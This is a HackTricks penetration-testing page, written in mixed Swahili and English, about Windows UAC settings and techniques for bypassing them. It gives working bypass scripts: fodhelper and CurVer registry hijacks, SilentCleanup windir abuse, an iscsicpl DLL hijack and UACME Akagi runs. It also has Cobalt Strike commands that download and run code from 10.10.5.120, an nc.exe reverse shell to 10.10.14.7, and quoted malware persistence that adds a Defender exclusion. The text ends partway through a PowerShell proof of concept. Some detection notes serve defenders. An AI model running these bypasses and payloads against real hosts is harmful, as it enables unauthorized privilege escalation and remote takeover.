# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) ni feature inayowezesha **ombi la idhini kwa shughuli zinazohitaji privileges zilizoinuliwa**. Applications zina viwango tofauti vya `integrity`, na program yenye **kiwango cha juu** inaweza kutekeleza tasks ambazo **zinaweza kuhatarisha mfumo**. UAC inapowezeshwa, applications na tasks daima **huendeshwa chini ya security context ya account isiyo ya administrator** isipokuwa administrator aidhinishe wazi applications/tasks hizo kupata access ya kiwango cha administrator kwenye mfumo ili ziendeshwe. Ni feature ya urahisi inayowalinda administrators dhidi ya mabadiliko yasiyokusudiwa, lakini haichukuliwi kuwa security boundary.<sup>[[2]](#references)</sup>

Kwa maelezo zaidi kuhusu viwango vya integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

UAC inapowekwa, mtumiaji wa administrator hupewa tokens 2: token ya standard user, kwa kutekeleza actions za kawaida katika medium integrity, na nyingine yenye admin privileges.

Hii [page](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) inaeleza kwa kina sana jinsi UAC inavyofanya kazi na inajumuisha mchakato wa logon, user experience, na UAC architecture.<sup>[[2]](#references)</sup> Administrators wanaweza kutumia security policies kusanidi jinsi UAC inavyofanya kazi kulingana na mahitaji ya organization yao katika kiwango cha local (kwa kutumia secpol.msc), au kuisanidi na kuisambaza kupitia Group Policy Objects (GPO) katika mazingira ya Active Directory domain. Settings mbalimbali zimejadiliwa kwa kina [hapa](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Kuna Group Policy settings 10 zinazoweza kuwekwa kwa UAC. Jedwali lifuatalo linatoa maelezo ya ziada:

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Disabled)                                             |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Prompt for consent for non-Windows binaries on the secure desktop) |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Prompt for credentials on the secure desktop)         |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Enabled; disabled by default on Enterprise)           |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Disabled)                                             |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Enabled)                                              |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Enabled)                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Disabled)                                             |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Enabled)                                              |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Enabled)                                              |

### Policies za kusakinisha software kwenye Windows

**local security policies** ("secpol.msc" kwenye systems nyingi) zimesanidiwa kwa default ili **kuwazuia users wasio-admin kufanya software installations**. Hii inamaanisha kwamba hata kama user asiye-admin anaweza kudownload installer ya software yako, hataweza kuiendesha bila account ya admin.

### Registry Keys za Kulazimisha UAC Kuomba Elevation

Kama standard user asiye na admin rights, unaweza kuhakikisha kuwa account ya "standard" **inaombwa credentials na UAC** inapojaribu kufanya actions fulani. Action hii ingehitaji kurekebisha **registry keys** fulani, ambazo zinahitaji admin permissions, isipokuwa kuwe na **UAC bypass**, au attacker tayari amelogin kama admin.

Hata kama user yuko katika group la **Administrators**, mabadiliko haya humlazimisha user **kuingiza tena account credentials** zake ili kufanya administrative actions.

**Kwa vitendo, hii ni muhimu tu ikiwa tayari una elevated token, UAC bypass, au misconfiguration inayokuruhusu kubadilisha keys hizi; vinginevyo registry write yenyewe huzuiwa.**

Registry keys na entries unazopaswa kubadilisha ni hizi zifuatazo (pamoja na default values zake kwenye mabano):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Hili pia linaweza kufanywa manually kupitia Local Security Policy tool. Baada ya kubadilishwa, administrative operations humwomba user aingize tena credentials zake.

### Note

**User Account Control si security boundary.** Kwa hiyo, standard users hawawezi kutoka kwenye accounts zao na kupata administrator rights bila local privilege escalation exploit.

### Muombe user 'full computer access'
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode hutumia ukaguzi wa integrity kuzuia michakato yenye kiwango cha juu cha integrity (kama web browsers) kufikia data yenye kiwango cha chini cha integrity (kama folda ya faili za muda za Internet). Hili hufanywa kwa kuendesha browser kwa kutumia token yenye kiwango cha chini cha integrity. Browser inapojaribu kufikia data iliyohifadhiwa katika eneo lenye kiwango cha chini cha integrity, operating system hukagua kiwango cha integrity cha mchakato na kuruhusu ufikiaji ipasavyo. Kipengele hiki husaidia kuzuia mashambulizi ya remote code execution kupata ufikiaji wa data nyeti kwenye mfumo.
- Mtumiaji anapoingia kwenye Windows, mfumo huunda access token iliyo na orodha ya privileges za mtumiaji. Privileges hufafanuliwa kama mchanganyiko wa rights na capabilities za mtumiaji. Token hiyo pia huwa na orodha ya credentials za mtumiaji, ambazo hutumika kum-authenticate mtumiaji kwenye kompyuta na kwenye resources za mtandao.

### Autoadminlogon

Ili kusanidi Windows iingie kiotomatiki kwa mtumiaji maalum wakati wa kuwasha, weka **`AutoAdminLogon` registry key**. Hii ni muhimu kwa mazingira ya kiosk au kwa madhumuni ya testing. Tumia hii kwenye mifumo salama pekee, kwa sababu huweka password wazi kwenye registry.

Weka keys zifuatazo ukitumia Registry Editor au `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Ili kurudisha tabia ya kawaida ya kuingia, weka `AutoAdminLogon` kuwa 0.

## UAC bypass

> [!TIP]
> Kumbuka kwamba ikiwa una graphical access kwa victim, UAC bypass ni rahisi moja kwa moja kwa sababu unaweza kubofya tu "Yes" prompt ya UAC inapoonekana

UAC bypass inahitajika katika hali ifuatayo: **UAC imewashwa, process yako inaendeshwa katika medium integrity context, na user wako ni wa administrators group**.

Ni muhimu kutaja kwamba **ni vigumu zaidi kubypass UAC ikiwa iko kwenye kiwango cha juu zaidi cha security (Always) kuliko ikiwa iko kwenye viwango vingine (Default).**

### Fast triage kutoka kwenye medium-integrity shell

Kabla ya kujaribu bypass, thibitisha kwamba uko katika hali sahihi na ulinganishe host build na methods zinazojulikana kufanya kazi:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Maelezo ya kiutendaji:
- Ikiwa `EnableLUA=0`, huhitaji bypass: token yoyote ya admin inaweza kuomba high integrity moja kwa moja.
- `ConsentPromptBehaviorAdmin=2` au `5` ndiyo hali ya kawaida kwa auto-elevate / COM-based bypasses.
- `Always Notify` huongeza kiwango cha ulinzi, lakini bado unapaswa kujaribu build halisi badala ya kudhani kuwa itashindikana: UACME bado inafuatilia baadhi ya mbinu zinazooana na `AlwaysNotify` kwenye Windows builds za kisasa.<sup>[[3]](#references)</sup>

### UAC imezimwa

Ikiwa UAC tayari imezimwa (`ConsentPromptBehaviorAdmin` ni **`0`), unaweza **kutekeleza reverse shell yenye admin privileges** (high integrity level) kwa kutumia kitu kama:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Msingi Sana** wa UAC "bypass" (ufikiaji kamili wa file system)

Ikiwa una shell yenye user aliye ndani ya group la Administrators unaweza **mount C$** iliyoshirikiwa kupitia SMB (file system) locally kwenye disk mpya na utakuwa na **ufikiaji wa kila kitu ndani ya file system** (hata folder la nyumbani la Administrator).

> [!WARNING]
> **Inaonekana trick hii haifanyi kazi tena**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Mbinu za Cobalt Strike zitafanya kazi tu ikiwa UAC haijawekwa kwenye kiwango chake cha juu zaidi cha usalama
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** na **Metasploit** pia zina modules kadhaa za **bypass** ya **UAC**.

### Elevated COM interfaces (`ICMLuaUtil` / `CMSTPLUA`)

Auto-elevated COM objects bado ni sehemu ya vitendo ya UAC kwenye builds za kisasa. `ICMLuaUtil` bado inafuatiliwa na UACME kama inayofanya kazi kwenye Windows branches za sasa, na offensive tooling inaendelea kuibadilisha `CMSTPLUA` kwa kuunganisha interactive desktop process, 64-bit execution, na wakati mwingine PEB/process masquerading kabla ya kuita COM Elevation Moniker.<sup>[[3]](#references)</sup>

Vidokezo vya vitendo:
- Pendelea process ya **64-bit** katika **interactive session** ya mtumiaji (mara nyingi `explorer.exe` au child wake).
- Ikiwa raw shell itashindwa, jaribu tena kutoka kwa BOF / UACME implementation badala ya naive `CreateProcess` wrapper.
- Tarajia child execution ifanyike katika **separate elevated process**; BOF nyingi hazi-elevate beacon ya sasa in-place.

### KRBUACBypass

Documentation na tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME**](https://github.com/hfiref0x/UACME) ni mkusanyiko wa UAC bypass techniques. Icompile kwa Visual Studio au MSBuild; build inaunda executables kadhaa (kwa mfano, `Source\Akagi\output\x64\Debug\Akagi.exe`), kwa hiyo chagua method inayofaa kwa target build.<sup>[[3]](#references)</sup>\
Kuwa mwangalifu: baadhi ya bypasses huzindua programs au prompts zinazoonekana ambazo zinaweza kumtahadharisha mtumiaji.<sup>[[3]](#references)</sup>

UACME ina **build version ambayo kila technique ilianza kufanya kazi**.<sup>[[3]](#references)</sup> Unaweza kutafuta technique inayoathiri versions zako:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Pia, ukitumia ukurasa [huu](https://en.wikipedia.org/wiki/Windows_10_version_history) unapata Windows release `1607` kutoka kwenye matoleo ya build.

Workflow ya vitendo ni **ku-score build ya host** kwanza, kisha kuanzisha method inayolingana:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` inalinganisha kwa haraka build ya ndani na mbinu zake zinazojulikana za UAC, jambo linalosaidia kuondoa haraka PoC ambazo hazifanyi kazi.<sup>[[4]](#references)</sup>
- `UACME` bado ndiyo catalogue bora ya umma ya kuoanisha bypass na build mahususi. Toleo la 3.7.1 liliongeza mbinu 83–85, huku release iliyotangulia ikijaribu tena mbinu zilizokuwepo dhidi ya **Windows 11 25H2**; kagua tena jedwali la mbinu na release notes badala ya kudhani kuwa PoC ya zamani bado inatumika bila mabadiliko.<sup>[[3]](#references)[[9]](#references)</sup>

### Minyororo ya WNF/UIAccess inayooana na Always Notify (UACME 3.7.1)

`Always Notify` haiondoi kila UAC bypass. UACME 3.7.1 inatekeleza mbinu tatu mpya za x64 zinazochanganya hali ya mazingira/protocol inayodhibitiwa na mtumiaji na tabia ya elevated scheduled-task au UIAccess, na kuziweka zote kama `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** elekeza upya `SystemRoot` ili WNF-triggered `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` ifanye elevated `taskhostw.exe` i-side-load `unifiedconsent.dll`. UACME inafuatilia mbinu hii kuanzia Windows 10 build 19041.
- **84 — TabTip:** tumia primitive ileile ya environment-variable dhidi ya UIAccess `TabTip.exe`, ambayo hupakia `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll`, au `rsaenh.dll` kulingana na build, kisha pivot kutoka kwenye UIAccess context yenye high-integrity inayotokana na mchakato huo. UACME inafuatilia mbinu hii kuanzia Windows 8.1 / Server 2016.
- **85 — Narrator:** hijack protocol ya `feedback-hub` ya kila mtumiaji, iendeshe Narrator kwa `Alt+CapsLock+F`, kisha uzindue nakala ya `osk.exe` inayoweza kuandikwa na ambayo i-side-load `OskSupport.dll`. Hii inahitaji interactive desktop na inafuatiliwa kuanzia Windows 10 1809 / Server 2019.

Baada ya kuunda payload units na Akagi kama ilivyoandikwa kwenye UACME, ita method number inayolingana (command ya hiari hutumia `cmd.exe` kwa default):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Methods 84 na 85 zinategemea UIAccess/desktop interaction, kwa hivyo usitarajie zifanye kazi bila mabadiliko kutoka Session 0 au service shell isiyo ya interactive. Zote tatu hubadilisha hali ya mazingira/protocol na kuweka DLLs; kagua implementation na uondoe artifacts hizo baada ya testing.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Binary inayoaminika `fodhelper.exe` hujiendesha kwa elevated privileges kiotomatiki kwenye Windows za kisasa. Inapozinduliwa, huuliza registry path ya kila user iliyo hapa chini bila ku-validate verb ya `DelegateExecute`. Kuweka command hapo humwezesha process ya Medium Integrity (user yuko kwenye Administrators) kuzindua process ya High Integrity bila UAC prompt.

Registry path inayoulizwa na fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Hatua za PowerShell (weka payload yako, kisha ianzishe)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Maelezo:
- Hufanya kazi wakati mtumiaji wa sasa ni mwanachama wa Administrators na kiwango cha UAC ni cha default/lenient (si Always Notify yenye vizuizi vya ziada).
- Tumia njia ya `sysnative` kuanzisha PowerShell ya 64-bit kutoka kwenye process ya 32-bit kwenye Windows ya 64-bit.
- Payload inaweza kuwa command yoyote (PowerShell, cmd, au njia ya EXE). Epuka UIs zinazoomba mwingiliano kwa ajili ya stealth.

#### CurVer/extension hijack variant (HKCU only)

Samples za hivi karibuni zinazotumia vibaya `fodhelper.exe` huepuka `DelegateExecute` na badala yake **hu-redirect `ms-settings` ProgID** kupitia thamani ya `CurVer` ya kila mtumiaji. Binary ya auto-elevated bado hutatua handler chini ya `HKCU`, kwa hivyo token ya admin haihitajiki kuweka keys:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Baada ya kupata privileges za juu, **malware kwa kawaida huzima maombi ya baadaye** kwa kuweka `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` kuwa `0`, kisha hufanya defense evasion ya ziada (kwa mfano, `Add-MpPreference -ExclusionPath C:\ProgramData`) na kuunda upya persistence ili iendeshe ikiwa na high integrity. Persistence task ya kawaida huhifadhi **PowerShell script iliyosimbwa kwa XOR** kwenye diski na kuifungua/kuiendesha kwenye memory kila saa:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Toleo hili bado husafisha dropper na huacha staged payloads pekee, hivyo detection hutegemea kufuatilia **`CurVer` hijack**, kuchezewa kwa `ConsentPromptBehaviorAdmin`, kuundwa kwa Defender exclusion, au scheduled tasks zinazofanya in-memory decryption ya PowerShell.<sup>[[5]](#references)</sup>

### UAC bypass kupitia task ya `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` huzindua `cleanmgr.exe` ikiwa na highest privileges na hupanua `%windir%` kutoka kwenye user environment. Ukidhibiti `HKCU\Environment\windir`, unaweza kuelekeza upanuzi huo kwenye command yoyote na kupata high integrity bila dialogu ya idhini.<sup>[[8]](#references)</sup> Mbinu hii bado inafaa kujaribiwa kwenye builds za hivi karibuni kwa sababu UACME inaendelea kuiweka technique hii active, na ufuatiliaji wa issues za hivi karibuni unaonyesha kuwa Windows 11 24H2 huenda ikahitaji tu marekebisho madogo ya quoting.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
If task hiyo itanukuu path kwenye build hiyo, jaribu tena kwa payload inayoishia na quote (kwa mfano `cmd.exe"`). Kila mara safisha `HKCU\Environment\windir` baada ya testing.

#### UAC bypass zaidi

UAC bypass nyingi za kawaida zinazotumia vibaya UI flows, COM objects, au desktop interaction zinahitaji **full interactive session** na victim; shell ya kawaida ya `nc.exe` au service inayofanya kazi katika **Session 0** mara nyingi haitoshi.

Mara nyingi unaweza kutatua hilo kwa kutumia session ya **meterpreter**. Hamia kwenye **process** yenye thamani ya **Session** iliyo sawa na **1**:

![Elekeza ms-settings kwenye extension maalum (.thm) na u-map extension hiyo kwenye payload yetu - More UAC bypass: Unaweza kupata hii kwa kutumia meterpreter session. Hamia kwenye process yenye Session...](<../../images/image (863).png>)

(_explorer.exe_ inapaswa kufanya kazi)

### UAC Bypass kwa GUI

Ikiwa una access ya **GUI unaweza tu kukubali UAC prompt** inapoonekana; kwa kweli huhitaji technical bypass. Kwa hivyo, kupata GUI session mara nyingi inatosha kuondoa kizuizi cha kiutendaji kinachoongezwa na UAC.

Zaidi ya hayo, ukipata GUI session ambayo mtu alikuwa akiitumia (huenda kupitia RDP) kuna **baadhi ya tools zitakuwa zinafanya kazi kama administrator** ambazo unaweza kutumia **ku-run** **cmd** kwa mfano **kama admin** moja kwa moja bila kuombwa tena na UAC, kama [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Hii inaweza kuwa **stealthy** zaidi.

### Noisy brute-force UAC bypass

Ikiwa noise inakubalika, tool kama [**ForceAdmin**](https://github.com/Chainski/ForceAdmin) inaweza kuomba elevation mara kwa mara hadi user aikubali.

### Bypass yako mwenyewe - Basic UAC bypass methodology

Ukiangalia **UACME**, utaona kwamba **UAC bypass nyingi zinatumia vibaya DLL hijacking** (mara nyingi kwa kufanya elevated binary ipakie DLL inayodhibitiwa na attacker kutoka kwenye writable path). [Soma hii ili ujifunze jinsi ya kupata vulnerability ya DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Tafuta binary ambayo **autoelevate** (hakikisha kwamba inapotekelezwa ina-run katika high integrity level).
2. Kwa kutumia procmon, tafuta events za "**NAME NOT FOUND**" ambazo zinaweza kuwa vulnerable kwa **DLL Hijacking**.
3. Huenda ukahitaji **kuandika** DLL ndani ya **protected paths** (kama C:\Windows\System32) ambako huna writing permissions. Unaweza kupita kizuizi hiki kwa kutumia:
1. **wusa.exe**: Windows 7,8 na 8.1. Inaruhusu kutoa content ya CAB file ndani ya protected paths (kwa sababu tool hii inatekelezwa kutoka kwenye high integrity level).
2. **IFileOperation**: Windows 10.
4. Andaa **script** ya kunakili DLL yako ndani ya protected path na kutekeleza binary yenye vulnerability na inayojifanyia autoelevation.

### Another UAC bypass technique

Inahusisha kuangalia ikiwa **autoElevated binary** inajaribu **kusoma** kutoka kwenye **registry** **name/path** ya **binary** au **command** ya **kutekelezwa** (hii inavutia zaidi ikiwa binary inatafuta taarifa hii ndani ya **HKCU**).

### UAC bypass kupitia `SysWOW64\iscsicpl.exe` + user `PATH` DLL hijack

`C:\Windows\SysWOW64\iscsicpl.exe` ya 32-bit ni binary ya **auto-elevated** inayoweza kutumiwa vibaya kupakia `iscsiexe.dll` kupitia search order. Ukiweza kuweka `iscsiexe.dll` hasidi ndani ya folder inayoweza kuandikwa na **user**, kisha urekebishe `PATH` ya current user (kwa mfano kupitia `HKCU\Environment\Path`) ili folder hiyo itafutwe, Windows inaweza kupakia attacker DLL ndani ya elevated `iscsicpl.exe` process **bila kuonyesha UAC prompt**.<sup>[[1]](#references)[[6]](#references)</sup>

Maelezo ya kiutendaji:
- Hii ni muhimu wakati current user yuko kwenye **Administrators** lakini ana-run katika **Medium Integrity** kwa sababu ya UAC.
- Nakala ya **SysWOW64** ndiyo inayohusika na bypass hii. Chukulia nakala ya **System32** kama binary tofauti na uvalidate behavior yake kivyake.
- Primitive hii ni mchanganyiko wa **auto-elevation** na **DLL search-order hijacking**, kwa hivyo ProcMon workflow ileile inayotumika kwa UAC bypass nyingine ni muhimu kuthibitisha missing DLL load.

Minimal flow:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Mawazo ya Detection:
- Weka alert kwenye `reg add` / registry writes kwenda `HKCU\Environment\Path` zinazofuatwa mara moja na execution ya `C:\Windows\SysWOW64\iscsicpl.exe`.
- Fanya hunt ya `iscsiexe.dll` katika maeneo **yanayodhibitiwa na mtumiaji**, kama vile `%TEMP%` au `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Correlate launches za `iscsicpl.exe` na child processes zisizotarajiwa au DLL loads kutoka nje ya Windows directories za kawaida.

### Utafiti mpya unaostahili kuchunguzwa kando

Baadhi ya chains za baada ya 2024 hazifanani tena na classic `HKCU\Software\Classes` registry hijacks. Kwa mfano, activation-context cache poisoning inaweza kuunganisha **drive remap** na **DLL redirection** ili kuhama kutoka medium integrity hadi high integrity kupitia trusted UI / auto-elevated binaries kama `ctfmon.exe` na targets za baadaye kama `fodhelper.exe`. Badala ya kurudia PoC kubwa hapa, angalia compact payload examples katika:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Administrator Protection (preview) drive-letter hijack kupitia per-logon-session DOS device map

> [!NOTE]
> Kufikia Agosti 2026, Microsoft bado inaandika Administrator Protection kama **Insider preview**: rollout ya Oktoba 2025 ilirudishwa nyuma na imepangwa kwa tarehe ya baadaye. Thibitisha kwamba **Admin Approval Mode with Administrator protection** imewezeshwa na kifaa kime-reboot kabla ya kujaribu chains hizi; version string ya kawaida ya 25H2 pekee haithibitishi kwamba feature hii iko active.<sup>[[10]](#references)</sup>

Kwa attack surface kamili ya `RAiLaunchAdminProcess` / UIAccess kwenye Windows 11 25H2 preview builds, angalia ukurasa maalum:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” hutumia shadow-admin tokens zenye per-session `\Sessions\0\DosDevices/<LUID>` maps. Directory huundwa kwa lazy kupitia `SeGetTokenDeviceMap` wakati wa first `\??` resolution. Ikiwa attacker ana-impersonate shadow-admin token kwenye **SecurityIdentification** pekee, directory huundwa huku attacker akiwa **owner** (inarithi `CREATOR OWNER`), hivyo kuruhusu drive-letter links zinazopata precedence kuliko `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Hatua:**

1. Kutoka kwenye session yenye privileges ndogo, ita `RAiProcessRunOnce` ili ku-spawn shadow-admin `runonce.exe` isiyoonyesha prompt.
2. Duplicate primary token yake kuwa **identification** token na ui-impersonate wakati wa kufungua `\??` ili kulazimisha kuundwa kwa `\Sessions\0\DosDevices/<LUID>` chini ya ownership ya attacker.
3. Unda `C:` symlink hapo inayoelekeza kwenye attacker-controlled storage; filesystem accesses zinazofuata katika session hiyo zita-resolve `C:` kwenda kwenye attacker path, zikiruhusu DLL/file hijack bila prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
